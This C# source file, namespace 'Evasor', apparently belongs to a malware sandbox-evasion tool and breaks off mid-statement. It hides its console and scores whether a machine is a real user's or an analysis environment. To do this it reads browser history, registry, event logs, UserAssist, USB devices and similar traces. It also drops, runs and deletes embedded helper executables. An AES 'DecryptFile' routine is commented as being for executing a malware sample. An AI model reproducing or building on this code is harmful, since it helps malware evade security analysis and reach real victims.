using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Management;
using System.Diagnostics;
using NetFwTypeLib;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Text.RegularExpressions;
using WUApiLib;
using System.Text;
using System.Security.Cryptography;

namespace Evasor
{
    //Browser classes
    public class Firefox
    {
        public List<URL> URLs { get; set; }
        public IEnumerable<URL> GetHistory()
        {
            string documentsFolder = Environment.GetFolderPath
                              (Environment.SpecialFolder.ApplicationData);
            documentsFolder += "\\Mozilla\\Firefox\\Profiles\\";
            if (Directory.Exists(documentsFolder))
            {
                // Loop each Firefox Profile
                foreach (string folder in Directory.GetDirectories(documentsFolder))
                {
                    // Fetch Profile History
                    return ExtractUserHistory(folder);
                }
            }
            return null;
        }
        IEnumerable<URL> ExtractUserHistory(string folder)
        {
            // Get User history info
            DataTable historyDT = ExtractFromTable("moz_places", folder);
            // Get visit Time/Data info
            DataTable visitsDT = ExtractFromTable("moz_historyvisits",folder);
            // Loop each history entry
            foreach (DataRow row in historyDT.Rows)
            {
                // Select entry Date from visits
                var entryDate = (from dates in visitsDT.AsEnumerable()
                                 where dates["place_id"].ToString() == row["id"].ToString()
                                 select dates).LastOrDefault();
                // If history entry has date
                if (entryDate != null)
                {
                    // Obtain URL and Title strings
                    string url = row["Url"].ToString();
                    string title = row["title"].ToString();

                    // Create new Entry
                    URL u = new URL(url.Replace('\'', ' '),
                                    title.Replace('\'', ' '),
                                    "Mozilla Firefox");

                    // Add entry to list
                    this.URLs.Add(u);
                }
            }
            return URLs;
        }
        DataTable ExtractFromTable(string table, string folder)
        {
            SQLiteConnection sql_con;
            SQLiteCommand sql_cmd;
            SQLiteDataAdapter DB;
            DataTable DT = new DataTable();

            // FireFox database file
            string dbPath = folder + "\\places.sqlite";

            // If file exists
            if (File.Exists(dbPath))
            {
                // Data connection
                sql_con = new SQLiteConnection("Data Source=" + dbPath +
                                    ";Version=3;New=False;Compress=True;");

                // Open the Connection
                sql_con.Open();
                sql_cmd = sql_con.CreateCommand();

                // Select Query
                string CommandText = "select * from " + table;

                // Populate Data Table
                DB = new SQLiteDataAdapter(CommandText, sql_con);
                DB.Fill(DT);

                // Clean up
                sql_con.Close();
            }
            return DT;
        }
    }
    public class URL
    {
        string url;
        string title;
        string browser;
        public URL(string url, string title, string browser)
        {
            this.url = url;
            this.title = title;
            this.browser = browser;
        }
    }
    //Windows Update Class
    class OSInfo
    {
        public string getOSInfo()
        {
            ManagementObjectSearcher objMOS = new ManagementObjectSearcher("SELECT * FROM  Win32_OperatingSystem");
            //string os = "\n";
            //int OSArch = 0;
            try
            {
                foreach (ManagementObject objManagement in objMOS.Get())
                {
                    return objManagement.GetPropertyValue("Version").ToString();
                }
            }
            catch (Exception)
            {
            }
            return "";
        }
    }
    //UserAssist Cache - Rot13
    static class Rot13
    {
        public static string Transform(string value)
        {
            char[] array = value.ToCharArray();
            for (int i = 0; i < array.Length; i++)
            {
                int number = (int)array[i];

                if (number >= 'a' && number <= 'z')
                {
                    if (number > 'm')
                    {
                        number -= 13;
                    }
                    else
                    {
                        number += 13;
                    }
                }
                else if (number >= 'A' && number <= 'Z')
                {
                    if (number > 'M')
                    {
                        number -= 13;
                    }
                    else
                    {
                        number += 13;
                    }
                }
                array[i] = (char)number;
            }
            return new string(array);
        }
    }
    class Program
    {
        //Final output string
        public static string otpt = "";
        //Final realness score
        public static int score = 0;
        //human presence vars
        public static bool rtTestPassed = false;
        public static bool winogradPassed = false;

        //Hide Console
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;

        private struct SHQUERYRBINFO
        {
            public int cbSize;
            public long i64Size;
            public long i64NumItems;
        }

        // Get information from recycle bin.
        [DllImport("shell32.dll")]
        private static extern int SHQueryRecycleBin(string pszRootPath,
            ref SHQUERYRBINFO pSHQueryRBInfo);

        //Decrypt function for exec sample/Mal
        public static void DecryptFile(string inputFile, string outputFile)
        {
            {
                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(password);

                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt,
                    RMCrypto.CreateDecryptor(key, key),
                    CryptoStreamMode.Read);

                FileStream fsOut = new FileStream(outputFile, FileMode.Create);

                int data;
                while ((data = cs.ReadByte()) != -1)
                    fsOut.WriteByte((byte)data);

                fsOut.Close();
                cs.Close();
                fsCrypt.Close();

            }
        }
        public static string password = "";

        static void Main(string[] args)
        {
            //Hide Console
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            //Antivirus recognition------------------------------------------------------------------------------
            try
            {
                string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                ManagementObjectSearcher searche = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searche.Get();
                int tmpCount = 0;
                foreach (ManagementObject virusChecker in instances)
                {
                    var virusCheckerName = virusChecker["displayName"];
                    if ((string)virusCheckerName == "Windows Defender")
                    {
                        continue;
                    }
                    tmpCount++;
                    otpt += virusCheckerName + " | ";
                }
                if (tmpCount >= 1)
                {
                    score++;
                    otpt += " +1 score for antivirus installation";
                }
                else otpt += " +0 score for antivirus installation";
            }

            catch
            {
                otpt += "\n___some exception in the AV code___\n" + "###############################";
            }

            //Browser
            Firefox obj = new Firefox();
            obj.URLs = new List<URL>();
            List<URL> histData = (List<URL>)obj.GetHistory();
            if (histData == null)
            {
                otpt += "\nNo firefox profiles exist, i.e. Firefox not installed\n" + "###############################";
            }
            else
            {
                otpt += "\n" + histData.Count + " entries exist in firefox history";
                if (histData.Count >= 100)
                {
                    score++;
                    otpt += " +1 score for firefox history";
                }
                else
                {
                    otpt += " -1 score for firefox history";
                    score--;
                }
            }
            otpt += "\n";

            //Default apps---------------------------------------------------------------------------------------
            string FileExtKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts";
            //Default browser
            try
            {
                RegistryKey browserKey = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.html\\UserChoice");
                string browser = (string)browserKey.GetValue("ProgID");
                if (browser.StartsWith("AppX"))
                {
                    score--;
                    otpt += "\n-1 score for default browser";
                }
                else if (browser.StartsWith("Chrome") || browser.StartsWith("MSEdge") || browser.StartsWith("Firefox") || browser.StartsWith("Opera"))
                {
                    score++;
                    otpt += "\n+1 score for default browser";
                }
                otpt += " | Default browser => " + browser;
            }
            catch
            {
                otpt += "\nError reading value for default browser." + "###############################";
            }
            //.mp4 files
            try
            {
                RegistryKey mp4Key = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.mp4\\UserChoice");
                string mp4Player = (string)mp4Key.GetValue("ProgID");
                if (mp4Player.StartsWith("AppX"))
                {
                    score--;
                    otpt += "\n-1 score for default mp4 player";
                }
                else
                {
                    score++;
                    otpt += "\n+1 score for default mp4 player";
                }
                otpt += " | Default mp4 player => " + mp4Player;
            }
            catch
            {
                otpt += "\nError reading value for default mp4 application." + "###############################";
            }
            //.mp3 files
            try
            {
                RegistryKey mp3Key = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.mp3\\UserChoice");
                string mp3Player = (string)mp3Key.GetValue("ProgID");
                if (mp3Player.StartsWith("AppX"))
                {
                    score--;
                    otpt += "\n-1 score for default mp3 player";
                }
                else
                {
                    score++;
                    otpt += "\n+1 score for default mp3 player";
                }
                otpt += " | Default mp3 player => " + mp3Player;
            }
            catch
            {
                otpt += "\nError reading value for default mp3 application." + "###############################";
            }
            //images
            try
            {
                RegistryKey imgKey = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.png\\UserChoice");
                string imgViewer = (string)imgKey.GetValue("ProgID");
                if (imgViewer.StartsWith("AppX"))
                {
                    score--;
                    otpt += "\n-1 score for default image viewer";
                }
                else
                {
                    score++;
                    otpt += "\n+1 score for default image viewer";
                }
                otpt += " | Default .png viewer => " + imgViewer;
            }
            catch
            {
                otpt += "\nError reading value for default mp3 application." + "###############################";
            }
            //pdf files
            try
            {
                RegistryKey pdfKey = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.pdf\\UserChoice");
                string pdfViewer = (string)pdfKey.GetValue("ProgID");
                if (pdfViewer.StartsWith("AppX"))
                {
                    score--;
                    otpt += "\n-1 score for default pdf viewer";
                }
                else
                {
                    score++;
                    otpt += "\n+1 score for default pdf viewer";
                }
                otpt += " | Default pdf viewer => " + pdfViewer;
            }
            catch
            {
                otpt += "\nError reading value for default pdf application." + "###############################";
            }
            //doc files
            try
            {
                RegistryKey docKey = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.doc\\UserChoice");
                string docViewer = (string)docKey.GetValue("ProgID");
                score++;
                otpt += "\n+1 score for default doc viewer";
                otpt += " | Default .doc viewer => " + docViewer;
            }
            catch
            {
                score--;
                otpt += "\n-1 score for default doc viewer";
                otpt += "\nError reading value for default doc application." + "###############################";
            }
            //.rar files
            try
            {
                RegistryKey rarKey = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.rar\\UserChoice");
                string util = (string)rarKey.GetValue("ProgID");
                score++;
                otpt += "\n+1 score for default .rar utility";
                otpt += " | Default .rar program => " + util;
            }
            catch
            {
                score--;
                otpt += "\n-1 score for default .rar utility";
                otpt += "\nError reading value for default rar application." + "###############################";
            }
            //.zip files
            try
            {
                RegistryKey zipKey = Registry.CurrentUser.OpenSubKey(FileExtKey + "\\.zip\\UserChoice");
                string zip = (string)zipKey.GetValue("ProgID");
                score++;
                otpt += "\n+1 score for default .zip utility";
                otpt += " | Default .zip program => " + zip;
            }
            catch
            {
                score--;
                otpt += "\n-1 score for default .zip utility";
                otpt += "\nError reading value for default zip application." + "###############################";
            }
            otpt += "\n";

            //Windows Events - Logs------------------------------------------------------------------------------
            var eLogs = EventLog.GetEventLogs();
            foreach (EventLog l in eLogs)
            {
                if (l.Log == "Security") continue;
                otpt += "\nTotal " + l.Entries.Count + " entries exist for " + l.Log + " log.";
                if(l.Log == "Application")
                {
                    if (l.Entries.Count < 10000 && l.Entries.Count >= 7000) otpt += " | +0 score";
                    else if(l.Entries.Count >= 10000)
                    {
                        score++;
                        otpt += " | +1 score";
                    }
                    else
                    {
                        score--;
                        otpt += " | -1 score";
                    }
                }
                else if (l.Log == "System")
                {
                    if (l.Entries.Count < 10000 && l.Entries.Count >= 8000) otpt += " | +0 score";
                    else if (l.Entries.Count >= 10000)
                    {
                        score++;
                        otpt += " | +1 score";
                    }
                    else
                    {
                        score--;
                        otpt += " | -1 score";
                    }
                }
                else if (l.Log == "Windows PowerShell")
                {
                    if (l.Entries.Count < 500 && l.Entries.Count >= 200) otpt += " | +0 score";
                    else if (l.Entries.Count >= 500)
                    {
                        score++;
                        otpt += " | +1 score";
                    }
                    else
                    {
                        score--;
                        otpt += " | -1 score";
                    }
                }
            }
            otpt += "\n";

            //Firewall rules count-------------------------------------------------------------------------------
            try
            {
                Type tNetFwPolicy2 = Type.GetTypeFromProgID("HNetCfg.FwPolicy2");
                INetFwPolicy2 fwPolicy2 = (INetFwPolicy2)Activator.CreateInstance(tNetFwPolicy2);
                otpt += "\nTotal " + fwPolicy2.Rules.Count + " firewall rules exists";
                if (fwPolicy2.Rules.Count < 1000 && fwPolicy2.Rules.Count >= 500) otpt += " | +0 score for FW rules";
                else if(fwPolicy2.Rules.Count >= 1000)
                {
                    score++;
                    otpt += " | +1 score for FW rules";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for FW rules";
                }
            }
            catch
            {
                otpt += "\nUnable to read firewall rules" + "###############################";
            }
            otpt += "\n";

            //Installed programs---------------------------------------------------------------------------------
            int installedProgs = 0;
            string uninstallKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
            try
            {
                RegistryKey regKey = Registry.LocalMachine.OpenSubKey(uninstallKey);
                string[] subKey = regKey.GetSubKeyNames().Select((c) =>
                {
                    RegistryKey rk = regKey.OpenSubKey(c);
                    string displayName = (string)rk.GetValue("DisplayName");
                    if (string.IsNullOrEmpty(displayName)) return "";
                    return displayName;
                }).ToArray<string>();
                foreach (string appName in subKey.OrderBy(c => c))
                {
                    if (appName != "" && !appName.StartsWith("{"))
                    {
                        installedProgs++;
                    }
                }
            }
            catch
            {
                otpt += "\nUnable to read InstalledProg Reg1" + "###############################";
            }
            try
            {
                RegistryKey regKey2 = Registry.CurrentUser.OpenSubKey(uninstallKey);
                string[] subKey2 = regKey2.GetSubKeyNames().Select((c) =>
                {
                    RegistryKey rk = regKey2.OpenSubKey(c);
                    string displayName = (string)rk.GetValue("DisplayName");
                    if (string.IsNullOrEmpty(displayName)) return "";
                    return displayName;
                }).ToArray<string>();
                foreach (string appName in subKey2.OrderBy(c => c))
                {
                    if (appName != "" && !appName.StartsWith("{"))
                    {
                        installedProgs++;
                    }
                }
            }
            catch
            {
                otpt += "\nUnable to read InstalledProg Reg2" + "###############################";
            }
            string uninstallKey2 = "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
            try
            {
                RegistryKey regKey3 = Registry.LocalMachine.OpenSubKey(uninstallKey2);
                string[] subKey3 = regKey3.GetSubKeyNames().Select((c) =>
                {
                    RegistryKey rk = regKey3.OpenSubKey(c);
                    string displayName = (string)rk.GetValue("DisplayName");
                    if (string.IsNullOrEmpty(displayName)) return "";
                    return displayName;
                }).ToArray<string>();
                foreach (string appName in subKey3.OrderBy(c => c))
                {
                    if (appName != "" && !appName.StartsWith("{"))
                    {
                        installedProgs++;
                    }
                }
            }
            catch
            {
                otpt += "\nUnable to read InstalledProg Reg3" + "###############################";
            }
            try
            {
                RegistryKey regKey4 = Registry.CurrentUser.OpenSubKey(uninstallKey2);
                if(regKey4 != null)
                {
                    string[] subKey4 = regKey4.GetSubKeyNames().Select((c) =>
                    {
                        RegistryKey rk = regKey4.OpenSubKey(c);
                        string displayName = (string)rk.GetValue("DisplayName");
                        if (string.IsNullOrEmpty(displayName)) return "";
                        return displayName;
                    }).ToArray<string>();
                    foreach (string appName in subKey4.OrderBy(c => c))
                    {
                        if (appName != "" && !appName.StartsWith("{"))
                        {
                            installedProgs++;
                        }
                    }
                }
            }
            catch
            {
                otpt += "\nUnable to read InstalledProg Reg4" + "###############################";
            }
            otpt += "\n" +  installedProgs.ToString() + " programs registry records found";
            if (installedProgs >= 200)
            {
                score++;
                otpt += " | +1 score for installedProg reg";
            }
            else otpt += " | +0 score for installedProg reg";
            otpt += "\n";

            //Number of running processes--------------------------------------------------------------------------
            try
            {
                Process[] processes = Process.GetProcesses();
                otpt += "\nNumber of running processes on the system = " + processes.Length;
                if(processes.Length >= 200)
                {
                    score++;
                    otpt += " | +1 score for number of running processes";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for number of running processes";
                }
            }
            catch
            {
                otpt += "\nUnable to get the list of running processes" + "###############################";
            }
            otpt += "\n";

            //Count of files/folders in tmp----------------------------------------------------------------------
            string tmpPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            tmpPath += "\\AppData\\Local\\Temp";
            try
            {
                int fCount = Directory.GetFiles(tmpPath).Length;
                int dCount = Directory.GetDirectories(tmpPath).Length;
                otpt += "\n" + (fCount + dCount).ToString() + " total files/folders in tmp directory";
                if (fCount + dCount >= 600)
                {
                    score++;
                    otpt += " | +1 score for no. of temp files";
                }
                else otpt += " | +0 score for no. of temp files";
            }
            catch
            {
                otpt += "\ntmp directory doesnot exist" + "###############################";
                score--;
                otpt += " | -1 score for temp files";
            }
            otpt += "\n";

            //Recycle Bin----------------------------------------------------------------------------------------
            try
            {
                SHQUERYRBINFO sqrbi = new SHQUERYRBINFO();
                sqrbi.cbSize = Marshal.SizeOf(typeof(SHQUERYRBINFO));
                int hresult = SHQueryRecycleBin(string.Empty, ref sqrbi);
                otpt += "\n" + ((int)sqrbi.i64NumItems).ToString() + " items present in recycle bin";
                if ((int)sqrbi.i64NumItems >= 5)
                {
                    score++;
                    otpt += " | +1 score for recycle bin";
                }
                else otpt += " | +0 score for recycle bin";
            }
            catch
            {
                otpt += "Unable to read contents of recycle bin" + "###############################";
            }
            otpt += "\n";

            //Thumbnail Cache------------------------------------------------------------------------------------
            string thumbCPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            //Size of icon/thumbnail cache
            try
            {
                var files = Directory.EnumerateFiles(thumbCPath);
                var currentSize = (from file in files let fileInfo = new FileInfo(file) select fileInfo.Length).Sum();
                int tcSize = (int)currentSize;
                tcSize /= 1048576;
                otpt += "\n" + tcSize + " MB data present in thumbnail cache";
                if (tcSize >= 30)
                {
                    score++;
                    otpt += " | +1 score for thumbnail cache";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for thumbnail cache";
                }
            }
            catch
            {
                otpt += "\nUnable to determine the size of thumbnail cache" + "###############################";
                score--;
                otpt += " | -1 score for thumbnail cache";
            }
            otpt += "\n";

            //Skype profile--------------------------------------------------------------------------------------
            int sProfCount = 0;
            string spPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            spPath += "\\AppData\\Roaming\\Skype";
            try
            {
                string[] skDir = Directory.GetDirectories(spPath);
                for (int i = 0; i < skDir.Length; i++)
                {
                    if (skDir[i].Replace(spPath + "\\", "").StartsWith("live"))
                    {
                        sProfCount++;
                    }
                }
                otpt += "\n" + sProfCount + " skype profiles found.";
                if(sProfCount > 0)
                {
                    score++;
                    otpt += " | +1 score for skype profiles";
                }
                else otpt += " | +0 score for skype profiles";
            }
            catch
            {
                otpt += "\nNo profile found, or skype is not installed." + "###############################";
            }
            otpt += "\n";

            //ShellBags------------------------------------------------------------------------------------------
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.SBECmd.exe"))
                {
                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.SBECmd.exe"), FileMode.Create))
                    {
                        for (int i = 0; i < stream.Length; i++)
                        {
                            fileStream.WriteByte((byte)stream.ReadByte());
                        }
                        fileStream.Close();
                    }
                }
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                startInfo.Arguments = "/c cd " + desktopPath + " && Evasor.SBECmd.exe -l --csv " + desktopPath;
                process.StartInfo = startInfo;
                process.Start();

                string result = process.StandardOutput.ReadToEnd();
                string[] lines = result.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                int shellBagCount = int.Parse(Regex.Replace(lines[^4].Substring(lines[^4].IndexOf(":") + 2), ",", string.Empty));
                otpt += "\n" + shellBagCount + " entries of shellbag exist";
                if (shellBagCount < 500 && shellBagCount > 150) otpt += " | +0 score for shellbag count";
                else if(shellBagCount >= 500)
                {
                    score++;
                    otpt += " | +1 score for shellbag count";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for shellbag count";
                }
                string outputFileLoc = Regex.Replace(lines[^9].Substring(lines[^9].IndexOf(":") + 2), "'", string.Empty);
                //Reading creation dates from csv file
                List<int> yearOfAccess = new List<int>();
                int errC = 0;
                using (var reader = new StreamReader(outputFileLoc))
                {
                    while (!reader.EndOfStream)
                    {
                        var line = reader.ReadLine();
                        var values = line.Split(',', StringSplitOptions.None);
                        if (values[10] != "" && values[10].Length > 10)
                        {
                            try
                            {
                                yearOfAccess.Add(int.Parse(values[10].Substring(0, 4)));
                            }
                            catch
                            {
                                errC++;
                            }
                        }
                    }
                }
                otpt += "\n" + errC + " count of records were not read" + "###############################\n";
                List<int> AccessYrNoDup = yearOfAccess.Distinct().ToList<int>();
                AccessYrNoDup.Sort();
                if (AccessYrNoDup[0] == 2020 || (AccessYrNoDup[1] == 2020 && AccessYrNoDup[0] != 2019) || !AccessYrNoDup.Contains(2020))
                {
                    score--;
                    otpt += " | -1 score for shellbag acc. dates";
                }
                else if (AccessYrNoDup[0] == 2019 && AccessYrNoDup[1] == 2020) otpt += " | +0 score for shellbag acc. dates";
                else
                {
                    score++;
                    otpt += " | +1 score for shellbag acc. dates";
                }
                otpt += "\n";
                foreach (int year in AccessYrNoDup)
                {
                    otpt += year + ", ";
                }
                otpt += " -> AccessDates";

                //Delete Files created
                File.Delete(desktopPath + "\\Evasor.SBECmd.exe");
                File.Delete(outputFileLoc);
                File.Delete(desktopPath + "\\!SBECmd_Messages.txt");
            }
            catch
            {
                score--;
                otpt += "-1 Score => Shellbag mega error??" + "###############################";
            }
            otpt += "\n";

            //Windows details, update details--------------------------------------------------------------------
            OSInfo osInfoObj = new OSInfo();
            string verInfo = osInfoObj.getOSInfo();
            if(verInfo != "")
            {
                string[] winInfo = verInfo.Split(new string[] { "." }, StringSplitOptions.None);
                if(winInfo[0] != "10")
                {
                    score--;
                    otpt += "\nNot Windows 10, -1 Score";
                }
                otpt += "\nBuild Number - " + winInfo[2];
                if(int.Parse(winInfo[2]) >= 18362)
                {
                    score++;
                    otpt += " | +1 score for build number";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for build number";
                }
            }
            else
            {
                score--;
                otpt += "\nProbably not win 10 | -1 score";
            }
            //Pending Updates
            IUpdateSession updateSession = new UpdateSession();
            IUpdateSearcher searcher = updateSession.CreateUpdateSearcher();
            ISearchResult updates = searcher.Search("IsInstalled=0 and Type='Software' and IsHidden=0");
            if (updates.Updates.Count == 0)
            {
                otpt += "\nUp to date";
                score++;
                otpt += " | +1 score for win update";
            }
            else
            {
                otpt += "\nCurrently there are " + updates.Updates.Count + " available updates:";
                foreach (IUpdate update in updates.Updates)
                {
                    otpt += "\n" + update.Title;
                }
                if(updates.Updates.Count <= 3)
                {
                    score++;
                    otpt += " | +1 score for win update";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for win update";
                }
            }
            otpt += "\n";

            //USB devices----------------------------------------------------------------------------------------
            ManagementObjectCollection collection;
            bool isBluetooth = false;
            try
            {
                using (var usbSearcher = new ManagementObjectSearcher(@"Select * From Win32_PnPEntity where DeviceID Like ""USB%"""))
                    collection = usbSearcher.Get();
                otpt += "\nUSB device list => ";
                foreach (var device in collection)
                {
                    string currDev = (string)device.GetPropertyValue("Description");
                    otpt += currDev + ", ";
                    if (currDev.Contains("luetooth"))
                    {
                        isBluetooth = true;
                    }
                }
                if (collection.Count < 10 && collection.Count > 5) otpt += " | +0 score for USB dev";
                else if(collection.Count >= 10)
                {
                    score++;
                    otpt += " | +1 score for USB dev";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for USB dev";
                }
                collection.Dispose();
            }
            catch
            {
                otpt += "\nUnable to read USB devices list" + "###############################";
                score--;
                otpt += " | -1 score for USB dev";
            }
            if (isBluetooth)
            {
                otpt += "\nBluetooth capability detected";
                score++;
                otpt += " | +1 score for bluetooth functionality";
            }
            otpt += "\n";

            //UserAssist Cache-----------------------------------------------------------------------------------
            try
            {
                int uAcount = 0;
                int exeCount = 0;
                int lnkCount = 0;
                string userAssistKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist";
                RegistryKey regKey = Registry.CurrentUser.OpenSubKey(userAssistKey);
                string[] subKey = regKey.GetSubKeyNames();
                otpt += "\nContents of UserAssist:";
                foreach (string sbkey in subKey)
                {
                    RegistryKey rk = regKey.OpenSubKey(sbkey + "\\Count");
                    string[] valueNames = rk.GetValueNames();
                    if (valueNames != null)
                    {
                        foreach (string vals in valueNames)
                        {
                            string tmpVal = Rot13.Transform(vals);
                            if (tmpVal.EndsWith("exe")) exeCount++;
                            if (tmpVal.EndsWith("lnk")) lnkCount++;
                            //otpt += "\n =>" + tmpVal;
                            uAcount++;
                        }
                    }
                }
                otpt += "\n" + exeCount + " total .exe entries in UserAssist cache";
                if (exeCount < 100 && exeCount >= 50) otpt += " | +0 score for exe entries";
                else if(exeCount >= 100)
                {
                    score++;
                    otpt += " | +1 score for exe entries";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for exe entries";
                }
                otpt += "\n" + lnkCount + " total .lnk entries in UserAssist cache";
                if (lnkCount < 30 && lnkCount >= 20) otpt += " | +0 score for lnk entries";
                else if (lnkCount >= 30)
                {
                    score++;
                    otpt += " | +1 score for lnk entries";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for lnk entries";
                }
                otpt += "\n" + uAcount + " total entries in UserAssist cache";
                if (uAcount < 180 && uAcount >= 100) otpt += " | +0 score for total UA entries";
                else if (uAcount >= 180)
                {
                    score++;
                    otpt += " | +1 score for total UA entries";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for total UA entries";
                }
            }
            catch
            {
                otpt += "\nUnable to read contents of UserAssist Cache" + "###############################";
                score--;
                otpt += " | -1 score for UA";
            }
            otpt += "\n";

            //RTKeyCount.exe-------------------------------------------------------------------------------------
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.RTKeyCount.exe"))
                {
                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount.exe"), FileMode.Create))
                    {
                        for (int i = 0; i < stream.Length; i++)
                        {
                            fileStream.WriteByte((byte)stream.ReadByte());
                        }
                        fileStream.Close();
                    }
                }
            }
            catch
            {
                otpt += "\nUnable to extract resource RTKeyCount.exe" + "###############################";
            }
            try
            {
                Process RTProc = new Process();
                ProcessStartInfo RTstartInfo = new ProcessStartInfo();
                RTstartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount.exe");
                RTProc.StartInfo = RTstartInfo;
                RTProc.Start();
                RTProc.WaitForExit();
            }
            catch
            {
                otpt += "\nUnable to execute RTKeyCount.exe" + "###############################";
            }

            //Delete Files created
            File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount.exe"));

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\timer.txt"))
            {
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\timer.txt");
                otpt += "\nTime taken to close the dialog box: " + text;
                string[] times = text.Split(new string[] { ":" }, StringSplitOptions.None);
                if(times[^2] == "00")
                {
                    float time = float.Parse(times[times.Length - 1]);
                    if (time > 3)
                    {
                        score++;
                        otpt += " | +1 score for time taken";
                    }
                    else
                    {
                        score--;
                        otpt += " | -1 score for time taken";
                    }
                }
                else
                {
                    score++;
                    otpt += " | +1 score for time taken";
                }
                
                //Delete
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\timer.txt");
            }
            else
            {
                otpt += "\nTimer file not found";
                score--;
                otpt += " | -1 score for timer";
            }
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\rtKsct.txt"))
            {
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\rtKsct.txt");
                otpt += "\nCount of key down events: " + text;
                int keyDowns = int.Parse(text);
                if (keyDowns < 10 && keyDowns > 0) otpt += " | +0 score for key downs";
                else if(keyDowns >= 10 && keyDowns < 100)
                {
                    score++;
                    otpt += " | +1 score for key downs";
                }
                else
                {
                    score--;
                    otpt += " | -1 score for key downs";
                }

                //Delete
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\rtKsct.txt");
            }
            else
            {
                otpt += "\nKeyCount file not found";
                score--;
                otpt += " | -1 score for key downs";
            }
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\error.txt"))
            {
                otpt += "\nSome internal error occured in RTKeyCount" + "###############################";
                //Delete
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\error.txt");
                score--;
                otpt += " | -1 score for key downs";
            }
            else
            {
                otpt += "\nRan without errors.";
            }
            otpt += "\n";
            
            //Reverse turing and Winograd Schema Challenge-------------------------------------------------------
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.WinXboxQnA.exe"))
                {
                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.WinXboxQnA.exe"), FileMode.Create))
                    {
                        for (int i = 0; i < stream.Length; i++)
                        {
                            fileStream.WriteByte((byte)stream.ReadByte());
                        }
                        fileStream.Close();
                    }
                }
            }
            catch
            {
                otpt += "\nUnable to extract resource WinXboxQnA.exe" + "###############################";
            }
            try
            {
                Process RTProc = new Process();
                ProcessStartInfo RTstartInfo = new ProcessStartInfo();
                RTstartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.WinXboxQnA.exe");
                RTProc.StartInfo = RTstartInfo;
                RTProc.Start();
                RTProc.WaitForExit();
            }
            catch
            {
                otpt += "\nUnable to execute WinXboxQnA.exe" + "###############################";
            }
            //Delete
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.WinXboxQnA.exe");

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTPass.txt"))
            {
                otpt += "\nWinograd Schema Challenge passed";
                winogradPassed = true;
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTPass.txt");
                string[] opArr = text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                if (int.Parse(opArr[1]) == 1)
